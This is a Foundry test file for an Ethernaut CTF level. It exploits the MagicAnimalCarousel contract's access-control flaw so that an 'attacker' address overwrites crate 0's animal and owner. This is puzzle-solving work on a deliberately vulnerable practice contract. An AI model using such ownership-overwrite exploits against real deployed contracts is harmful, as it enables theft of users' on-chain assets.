// SPDX-License-Identifier: MIT
pragma solidity =0.8.28;

import "forge-std/Test.sol";
import {MagicAnimalCarousel} from "../../src/ethernaut2025/MagicAnimalCarousel.sol";

contract MagicAnimalCarouselTest is Test {
    MagicAnimalCarousel carousel;
    address attacker = makeAddr("attacker");

    function setUp() public {
        carousel = new MagicAnimalCarousel();
    }

    function testMagicAnimalCarouselExploit() public {
        // Crate 0 is initialized by the constructor with owner == address(0).
        // changeAnimal() with a non-zero animal skips the owner check and
        // lets anyone overwrite the crate's animal AND owner.
        vm.prank(attacker);
        carousel.changeAnimal("Horse", 0);
        uint256 animal = carousel.carousel(0) >> 176;
        uint256 horseEnc = uint256(bytes32(abi.encodePacked("Horse"))) >> 176;
        assertEq(animal, horseEnc);
        assertEq(address(uint160(carousel.carousel(0))), attacker);
    }
}

contract MagicAnimalCarouselControlTest is Test {
    function testCrateZeroInitialized() public {
        MagicAnimalCarousel carousel = new MagicAnimalCarousel();
        assertTrue(carousel.carousel(0) != 0);
    }
}

// end

